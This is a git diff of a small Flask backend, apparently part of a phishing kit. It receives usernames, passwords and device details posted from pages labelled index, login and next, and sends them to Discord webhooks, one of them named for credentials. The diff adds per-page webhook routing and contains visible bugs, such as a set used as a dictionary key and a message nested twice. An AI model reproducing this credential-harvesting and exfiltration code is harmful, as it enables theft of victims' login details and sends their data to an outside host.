@@ -1,6 +1,5 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import logging
 import os
 import requests
 
@@ -9,7 +8,11 @@ app = Flask(__name__)
 
 CORS(app)  # Habilita CORS para todas as origens
 
-DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
+# DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
+DISCORD_WEBHOOK_URL_INDEX = os.getenv('DISCORD_WEBHOOK_URL_INDEX')
+DISCORD_WEBHOOK_URL_LOGIN = os.getenv('DISCORD_WEBHOOK_URL_LOGIN')
+DISCORD_WEBHOOK_URL_CREDENTIALS = os.getenv('DISCORD_WEBHOOK_URL_CREDENTIALS')
+DISCORD_WEBHOOK_URL_NEXT = os.getenv('DISCORD_WEBHOOK_URL_NEXT')
 
 @app.route('/send-message', methods=['POST'])
 def send_message():
@@ -20,14 +23,20 @@ def send_message():
     if not username or not password:
         return jsonify({"error": "Campos obrigatórios ausentes"}), 400
 
-    payload = {
-        "content": f"---\n**DADOS RECEBIDOS:**\nUsuário: {username}\nSenha: {password}\n---"
+    message = {
+        "content": (
+            f"------------------------------------------------------------------\n"
+            f"**DADOS RECEBIDOS:**\n"
+            f"Usuário: {username}\n"
+            f"Senha: {password}\n"
+            f"------------------------------------------------------------------\n"
+        )
     }
 
-    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
+    payload = {"content": message}
+    response = requests.post(DISCORD_WEBHOOK_URL_CREDENTIALS, json=payload)
 
     if response.status_code == 204:
-        logger.info(payload)
         return jsonify({"success": "Mensagem enviada ao Discord"}), 200
     else:
         return jsonify({"error": "Falha ao enviar mensagem", "details": response.text}), 500
@@ -45,9 +54,16 @@ def device_info():
         # f"**Fuso horário:** {data.get('timezone')}\n"
         f"**User-Agent:** {data.get('userAgent')}"
     )
+    payload = {"content": message}
 
     # Enviar para o Discord
-    payload = {"content": message}
+    whereami = {data.get('page')}
+    mapping = {
+        "index": DISCORD_WEBHOOK_URL_INDEX,
+        "login": DISCORD_WEBHOOK_URL_LOGIN,
+        "next": DISCORD_WEBHOOK_URL_NEXT
+    }
+    DISCORD_WEBHOOK_URL = mapping.get(whereami, "")
     response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
 
     if response.status_code == 204:
